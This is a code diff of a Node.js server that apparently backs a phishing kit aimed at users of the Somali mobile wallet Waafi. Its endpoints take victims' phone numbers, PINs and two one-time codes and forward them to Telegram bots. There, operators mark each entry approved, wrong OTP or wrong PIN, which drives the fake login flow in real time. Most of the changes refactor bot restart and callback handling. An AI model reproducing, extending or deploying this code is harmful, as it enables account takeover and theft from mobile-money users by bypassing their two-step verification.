@@ -1,4 +1,4 @@
-// server.js - Waafi Somalia - TWO-STEP OTP VERIFICATION
+// server.js - Waafi Somalia - TWO-STEP OTP VERIFICATION (UPDATED - Zimbabwe Approach)
 const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
@@ -334,7 +334,7 @@ const formatSecondOTPMessage = (user, data) => {
 };
 
 // ============================================
-// BOT MANAGER
+// BOT MANAGER - UPDATED WITH ZIMBABWE APPROACH
 // ============================================
 class BotManager {
   constructor(user, linkInsert) {
@@ -348,7 +348,7 @@ class BotManager {
     this.maxRestartAttempts = CONFIG.MAX_BOT_RESTART_ATTEMPTS;
     this.pollingErrorCount = 0;
     this.lastHealthCheck = Date.now();
-    this.restartScheduled = false;
+    this.restartScheduled = false; // CRITICAL: Prevent double-restarts
   }
 
   async initialize() {
@@ -387,6 +387,7 @@ class BotManager {
         filepath: false
       });
 
+      // Setup handlers BEFORE starting polling
       this.setupErrorHandlers();
       this.setupCommands();
 
@@ -396,12 +397,13 @@ class BotManager {
 
       await this.verifyBot();
 
+      // Mark as healthy
       this.user.isHealthy = true;
       this.user.bot = this.bot;
       this.restartAttempts = 0;
       this.pollingErrorCount = 0;
       this.lastHealthCheck = Date.now();
-      this.restartScheduled = false;
+      this.restartScheduled = false; // Clear any restart flags
       
       logger.info(`✅ ${this.user.name}: Bot initialized successfully`);
       return true;
@@ -420,8 +422,10 @@ class BotManager {
     logger.info(`${this.user.name}: Cleaning up bot...`);
 
     try {
+      // Remove all listeners first
       this.bot.removeAllListeners();
 
+      // Stop polling if active
       if (this.isPolling) {
         try {
           await this.bot.stopPolling({ cancel: true, reason: 'Cleanup' });
@@ -431,12 +435,13 @@ class BotManager {
         }
       }
 
+      // Try to abort any pending requests
       try {
         if (this.bot._polling) {
           this.bot._polling.abort = true;
         }
       } catch (e) {
-        logger.debug(`${this.user.name}: Close connection error (ignoring):`, e.message);
+        logger.debug(`${this.user.name}: Abort error (ignoring):`, e.message);
       }
 
     } catch (error) {
@@ -449,17 +454,20 @@ class BotManager {
   }
 
   setupErrorHandlers() {
+    // FIXED polling error handler - prevents restart cascades (Zimbabwe style)
     this.bot.on('polling_error', (error) => {
       this.pollingErrorCount++;
       
+      // Don't spam logs with connection errors
       if (error.code === 'ECONNRESET' || error.code === 'ETIMEDOUT' || error.code === 'ENOTFOUND') {
         if (this.pollingErrorCount > 10) {
           logger.warn(`${this.user.name}: Connection issues - will monitor`);
           this.pollingErrorCount = 0;
         }
-        return;
+        return; // Ignore transient network errors
       }
 
+      // Log important errors
       logger.error(`${this.user.name}: Polling error #${this.pollingErrorCount}:`, error.message);
 
       if (error.code === 'EFATAL') {
@@ -473,8 +481,16 @@ class BotManager {
           this.cleanup();
         } 
         else if (error.response?.statusCode === 409) {
-          logger.error(`${this.user.name}: Conflict - another instance polling`);
-          this.scheduleRestart(10000);
+          // CRITICAL FIX: Only restart ONCE on 409, not repeatedly
+          logger.warn(`${this.user.name}: 409 Conflict - another instance polling`);
+          
+          // Only schedule restart if not already restarting
+          if (!this.isInitializing && !this.restartScheduled) {
+            this.restartScheduled = true;
+            this.scheduleRestart(10000);
+          } else {
+            logger.warn(`${this.user.name}: Restart already scheduled or in progress...`);
+          }
         }
         else if (error.response?.statusCode === 429) {
           const retryAfter = error.response.parameters?.retry_after || 30;
@@ -507,6 +523,7 @@ class BotManager {
       return;
     }
 
+    // CRITICAL: Prevent multiple simultaneous restart schedules
     if (this.restartScheduled) {
       logger.warn(`${this.user.name}: Restart already scheduled...`);
       return;
@@ -517,11 +534,12 @@ class BotManager {
     logger.info(`${this.user.name}: Scheduling restart #${this.restartAttempts} in ${delay/1000}s...`);
 
     setTimeout(async () => {
-      this.restartScheduled = false;
+      this.restartScheduled = false; // Clear flag before restart
       try {
         await this.initialize();
       } catch (error) {
         logger.error(`${this.user.name}: Restart failed:`, error.message);
+        this.restartScheduled = false;
       }
     }, delay);
   }
@@ -633,21 +651,42 @@ async function handleCallbackQuery(user, query) {
   const chatId = msg.chat.id;
   const messageId = msg.message_id;
 
-  logger.debug(`${user.name}: Callback received - ${data}`);
+  const acknowledgeCallback = async (text, showAlert = false) => {
+    try {
+      await user.bot.answerCallbackQuery(query.id, { text, show_alert: showAlert });
+    } catch (e) {
+      logger.debug(`${user.name}: Callback acknowledge error:`, e.message);
+    }
+  };
+
+  const updateMessage = async (text, keyboard = null) => {
+    try {
+      const options = {
+        chat_id: chatId,
+        message_id: messageId,
+        parse_mode: 'HTML',
+        reply_markup: keyboard || { inline_keyboard: [] }
+      };
+      await user.bot.editMessageText(text, options);
+      return true;
+    } catch (e) {
+      if (e.message?.includes('message is not modified')) {
+        logger.debug(`${user.name}: Message already updated`);
+        return true;
+      }
+      logger.error(`${user.name}: Message update error:`, e.message);
+      return false;
+    }
+  };
 
   try {
-    await user.bot.answerCallbackQuery(query.id, { text: '⏳ Processing...' })
-      .catch(e => logger.debug(`Ack error: ${e.message}`));
+    await acknowledgeCallback('⏳ Processing...');
 
     const parts = data.split('_');
-    logger.debug(`${user.name}: Parsed parts:`, parts);
     
     if (parts.length < 3) {
       logger.error(`${user.name}: Invalid callback data format: ${data}`);
-      await user.bot.answerCallbackQuery(query.id, { 
-        text: '❌ Invalid data format', 
-        show_alert: true 
-      }).catch(e => logger.debug(`Error: ${e.message}`));
+      await acknowledgeCallback('❌ Invalid data format', true);
       return;
     }
 
@@ -667,10 +706,10 @@ async function handleCallbackQuery(user, query) {
       
       if (!loginData) {
         logger.warn(`${user.name}: Login session not found: ${loginKey}`);
-        await user.bot.editMessageText(
-          `❌ <b>SESSION NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> Session expired`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        await updateMessage(
+          `❌ <b>SESSION NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> Session expired`
+        );
+        await acknowledgeCallback('❌ Session not found', true);
         return;
       }
 
@@ -681,10 +720,16 @@ async function handleCallbackQuery(user, query) {
         loginData.approved = false;
         loginData.rejected = true;
         
-        await user.bot.editMessageText(
-          `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        await updateMessage(
+          `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`
+        );
+        await acknowledgeCallback('⏰ Session expired', true);
+        return;
+      }
+
+      if (loginData.approved || loginData.rejected) {
+        const status = loginData.approved ? 'approved' : 'rejected';
+        await acknowledgeCallback(`⚠️ Already ${status}`, true);
         return;
       }
 
@@ -710,13 +755,11 @@ async function handleCallbackQuery(user, query) {
           `${isReturning ? '⏱️ <b>Cache valid for 30 min</b>\n' : ''}` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        logger.info(`${user.name}: ✅ Login approved for ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('✅ User approved successfully!');
+          logger.info(`${user.name}: ✅ Login approved for ${phoneNumber}`);
+        }
       }
       else if (action === 'invalid') {
         logger.info(`${user.name}: ❌ Rejecting login - ${phoneNumber}`);
@@ -735,13 +778,14 @@ async function handleCallbackQuery(user, query) {
           `❌ <b>Status:</b> Rejected\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        logger.info(`${user.name}: ❌ Login rejected for ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('❌ Marked as invalid');
+          logger.info(`${user.name}: ❌ Login rejected for ${phoneNumber}`);
+        }
+      }
+      else {
+        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
       }
     }
     
@@ -755,16 +799,10 @@ async function handleCallbackQuery(user, query) {
       if (!otpData) {
         logger.warn(`${user.name}: First OTP session not found: ${verificationKey}`);
         
-        // This might be a duplicate click after already processing
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Already processed or session expired', 
-          show_alert: true 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        await user.bot.editMessageText(
-          `❌ <b>FIRST OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired or already processed`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        await updateMessage(
+          `❌ <b>FIRST OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired or already processed`
+        );
+        await acknowledgeCallback('⚠️ Already processed or session expired', true);
         return;
       }
 
@@ -774,10 +812,15 @@ async function handleCallbackQuery(user, query) {
         otpData.expired = true;
         otpData.status = 'timeout';
         
-        await user.bot.editMessageText(
-          `⏰ <b>FIRST OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        await updateMessage(
+          `⏰ <b>FIRST OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`
+        );
+        await acknowledgeCallback('⏰ Session expired', true);
+        return;
+      }
+
+      if (otpData.status !== 'pending') {
+        await acknowledgeCallback(`⚠️ Already processed: ${otpData.status}`, true);
         return;
       }
 
@@ -786,22 +829,8 @@ async function handleCallbackQuery(user, query) {
       if (action === 'correct') {
         logger.info(`${user.name}: ✅ Approving First OTP - ${phoneNumber}`);
         
-        // Check if already processed
-        const processKey = `firstotp-${verificationKey}`;
-        if (user.processedOtps.has(processKey)) {
-          logger.warn(`${user.name}: First OTP already processed (duplicate click) - ${phoneNumber}`);
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '✅ Already approved!', 
-            show_alert: false 
-          }).catch(e => logger.debug(`Ack error: ${e.message}`));
-          return;
-        }
-        
         otpData.status = 'approved';
         otpData.processedAt = Date.now();
-        
-        // Mark as processed
-        user.processedOtps.set(processKey, Date.now());
         
         const statusMessage = 
           `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>\n\n` +
@@ -813,17 +842,11 @@ async function handleCallbackQuery(user, query) {
           `➡️ <b>Next:</b> Second OTP (2/2) will be sent\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '✅ First OTP verified!' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        logger.info(`${user.name}: ✅ First OTP approved for ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('✅ First OTP verified!');
+          logger.info(`${user.name}: ✅ First OTP approved for ${phoneNumber}`);
+        }
       }
       else if (action === 'wrong') {
         logger.info(`${user.name}: ❌ Wrong First OTP - ${phoneNumber}`);
@@ -840,17 +863,11 @@ async function handleCallbackQuery(user, query) {
           `❌ <b>Status:</b> Invalid first OTP\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Marked as wrong' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        logger.info(`${user.name}: ❌ Wrong First OTP for ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('❌ Marked as wrong');
+          logger.info(`${user.name}: ❌ Wrong First OTP for ${phoneNumber}`);
+        }
       }
       else if (action === 'wrongpin') {
         logger.info(`${user.name}: ⚠️ Wrong PIN (First OTP) - ${phoneNumber}`);
@@ -867,17 +884,14 @@ async function handleCallbackQuery(user, query) {
           `⚠️ <b>Status:</b> Incorrect PIN\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Marked as wrong PIN' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        logger.info(`${user.name}: ⚠️ Wrong PIN for First OTP - ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('⚠️ Marked as wrong PIN');
+          logger.info(`${user.name}: ⚠️ Wrong PIN for First OTP - ${phoneNumber}`);
+        }
+      }
+      else {
+        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
       }
     }
     
@@ -896,22 +910,14 @@ async function handleCallbackQuery(user, query) {
         
         if (isNowVerified) {
           logger.info(`${user.name}: Second OTP already processed - user is cached`);
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '✅ Already processed - user is verified', 
-            show_alert: true 
-          }).catch(e => logger.debug(`Ack error: ${e.message}`));
+          await acknowledgeCallback('✅ Already processed - user is verified', true);
           return;
         }
         
-        await user.bot.editMessageText(
-          `❌ <b>SECOND OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Session not found or expired', 
-          show_alert: true 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
+        await updateMessage(
+          `❌ <b>SECOND OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`
+        );
+        await acknowledgeCallback('❌ Session not found or expired', true);
         return;
       }
 
@@ -921,10 +927,15 @@ async function handleCallbackQuery(user, query) {
         otpData.expired = true;
         otpData.status = 'timeout';
         
-        await user.bot.editMessageText(
-          `⏰ <b>SECOND OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        await updateMessage(
+          `⏰ <b>SECOND OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`
+        );
+        await acknowledgeCallback('⏰ Session expired', true);
+        return;
+      }
+
+      if (otpData.status !== 'pending') {
+        await acknowledgeCallback(`⚠️ Already processed: ${otpData.status}`, true);
         return;
       }
 
@@ -933,22 +944,8 @@ async function handleCallbackQuery(user, query) {
       if (action === 'correct') {
         logger.info(`${user.name}: ✅ Approving Second OTP - ${phoneNumber}`);
         
-        // Check if already processed
-        const processKey = `secondotp-${verificationKey}`;
-        if (user.processedOtps.has(processKey)) {
-          logger.warn(`${user.name}: Second OTP already processed (duplicate click) - ${phoneNumber}`);
-          await user.bot.answerCallbackQuery(query.id, { 
-            text: '✅ Already approved and user cached!', 
-            show_alert: false 
-          }).catch(e => logger.debug(`Ack error: ${e.message}`));
-          return;
-        }
-        
         otpData.status = 'approved';
         otpData.processedAt = Date.now();
-        
-        // Mark as processed
-        user.processedOtps.set(processKey, Date.now());
         
         // Cache the verified user (both OTPs verified)
         cacheVerifiedUser(user, phoneNumber);
@@ -965,17 +962,11 @@ async function handleCallbackQuery(user, query) {
           `⏱️ <b>Cached for 30 minutes</b>\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '✅ Verified & cached!' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        logger.info(`${user.name}: ✅ Second OTP approved and user cached for ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('✅ Verified & cached!');
+          logger.info(`${user.name}: ✅ Second OTP approved and user cached for ${phoneNumber}`);
+        }
       }
       else if (action === 'wrong') {
         logger.info(`${user.name}: ❌ Wrong Second OTP - ${phoneNumber}`);
@@ -992,17 +983,11 @@ async function handleCallbackQuery(user, query) {
           `❌ <b>Status:</b> Invalid second OTP\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Marked as wrong' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        logger.info(`${user.name}: ❌ Wrong Second OTP for ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('❌ Marked as wrong');
+          logger.info(`${user.name}: ❌ Wrong Second OTP for ${phoneNumber}`);
+        }
       }
       else if (action === 'wrongpin') {
         logger.info(`${user.name}: ⚠️ Wrong PIN (Second OTP) - ${phoneNumber}`);
@@ -1019,18 +1004,19 @@ async function handleCallbackQuery(user, query) {
           `⚠️ <b>Status:</b> Incorrect PIN\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
-        await user.bot.editMessageText(statusMessage, {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'HTML'
-        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Marked as wrong PIN' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
-        logger.info(`${user.name}: ⚠️ Wrong PIN for Second OTP - ${phoneNumber}`);
+        const updated = await updateMessage(statusMessage);
+        if (updated) {
+          await acknowledgeCallback('⚠️ Marked as wrong PIN');
+          logger.info(`${user.name}: ⚠️ Wrong PIN for Second OTP - ${phoneNumber}`);
+        }
       }
+      else {
+        await acknowledgeCallback(`❌ Unknown action: ${action}`, true);
+      }
+    }
+    else {
+      logger.warn(`${user.name}: Unknown callback type: ${type}`);
+      await acknowledgeCallback(`❌ Unknown type: ${type}`, true);
     }
 
   } catch (error) {
@@ -1038,10 +1024,7 @@ async function handleCallbackQuery(user, query) {
     logger.error(error.stack);
     
     try {
-      await user.bot.answerCallbackQuery(query.id, { 
-        text: '❌ An error occurred', 
-        show_alert: true 
-      });
+      await acknowledgeCallback('❌ An error occurred', true);
     } catch (e) {
       logger.error(`${user.name}: Failed to send error notification:`, e.message);
     }
@@ -1102,9 +1085,8 @@ const loadUsers = () => {
         isHealthy: false,
         consecutiveErrors: 0,
         loginNotifications: new Map(),
-        firstOtpVerifications: new Map(),  // NEW
-        secondOtpVerifications: new Map(), // NEW
-        processedOtps: new Map(), // Track processed OTPs to prevent duplicates
+        firstOtpVerifications: new Map(),
+        secondOtpVerifications: new Map(),
         verifiedUsers: new Map(),
         processedRequests: new Map(),
         errorCount: 0,
@@ -1156,6 +1138,10 @@ const initializeAllBotsStaggered = async () => {
   }
   
   logger.info('All bots initialization complete');
+  
+  // Show final status
+  const healthyBots = userArray.filter(u => u.isHealthy).length;
+  logger.info(`✅ ${healthyBots}/${userArray.length} bots are healthy`);
 };
 
 initializeAllBotsStaggered();
@@ -1277,20 +1263,6 @@ setInterval(() => {
           logger.info(`${user.name}: Cleaned up ${expiredCount} expired verified users (30-min cache)`);
         }
         
-        // Clean up processed OTPs older than 10 minutes
-        let processedOtpsCleaned = 0;
-        const processedOtpThreshold = now - (10 * 60 * 1000);
-        for (const [key, timestamp] of user.processedOtps.entries()) {
-          if (timestamp < processedOtpThreshold) {
-            user.processedOtps.delete(key);
-            processedOtpsCleaned++;
-          }
-        }
-        
-        if (processedOtpsCleaned > 0) {
-          logger.debug(`${user.name}: Cleaned up ${processedOtpsCleaned} old processed OTP records`);
-        }
-        
       } catch (error) {
         logger.error(`Cleanup error for ${user.name}:`, error.message);
       }
@@ -1356,7 +1328,7 @@ app.get('/api/health', (req, res) => {
 users.forEach((user, linkInsert) => {
   const basePath = `/api/${linkInsert}`;
 
-  // Check user status (existing)
+  // Check user status
   app.post(`${basePath}/check-user-status`, async (req, res) => {
     try {
       const { phoneNumber } = req.body;
@@ -1393,7 +1365,7 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  // Check login approval (existing)
+  // Check login approval
   app.post(`${basePath}/check-login-approval`, async (req, res) => {
     try {
       const { phoneNumber, pin } = req.body;
@@ -1480,7 +1452,7 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  // Login (existing)
+  // Login
   app.post(`${basePath}/login`, async (req, res) => {
     try {
       if (!user.bot) {
@@ -1579,7 +1551,7 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  // ========== NEW: FIRST OTP ENDPOINTS ==========
+  // ========== FIRST OTP ENDPOINTS ==========
   
   // Verify First OTP
   app.post(`${basePath}/verify-first-otp`, async (req, res) => {
@@ -1764,7 +1736,7 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  // Request Second OTP (called after first OTP is approved)
+  // Request Second OTP
   app.post(`${basePath}/request-second-otp`, async (req, res) => {
     try {
       const { phoneNumber, firstOtp, timestamp } = req.body;
@@ -2145,14 +2117,14 @@ setInterval(() => {
 const server = app.listen(PORT, () => {
   console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`🇸🇴 Waafi Somalia - TWO-STEP OTP System`);
+  console.log(`🇸🇴 Waafi Somalia - TWO-STEP OTP System (UPDATED)`);
   console.log(`👥 Active users: ${users.size}/${CONFIG.MAX_USERS}`);
   console.log(`⏱️  Approval timeout: ${CONFIG.APPROVAL_TIMEOUT / 60000} minutes`);
   console.log(`⏱️  User cache duration: ${CONFIG.USER_CACHE_DURATION / 60000} minutes`);
   console.log(`🔢 Max concurrent requests: ${CONFIG.MAX_CONCURRENT_REQUESTS}`);
   console.log(`♻️  Returning users skip both OTPs for 30 min`);
   console.log(`🔐 New users verify 2 OTPs`);
-  console.log(`🐛 DEBUG: Enhanced logging enabled`);
+  console.log(`✨ IMPROVEMENTS: Zimbabwe-style error handling applied`);
   console.log('\n📋 Active endpoints:');
   users.forEach((user, linkInsert) => {
     const status = user.isHealthy ? '✅' : '⏳';
